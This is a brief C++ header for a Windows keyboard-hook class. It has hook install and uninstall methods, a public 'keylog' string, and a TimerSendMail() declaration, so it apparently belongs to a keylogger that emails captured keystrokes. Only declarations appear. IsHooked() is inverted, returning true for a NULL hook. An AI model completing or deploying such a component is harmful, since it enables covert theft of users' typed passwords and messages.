#pragma once

#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <string>
#include <windows.h>

class KeyboardManager
{

public:
	KeyboardManager();

	bool InstallHooks();
	bool UninstallHooks();
	bool IsHooked() const {	return eHook == NULL; }

	std::string keylog;

private:
	LRESULT KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam);

	HHOOK eHook;
};

void TimerSendMail();

#endif
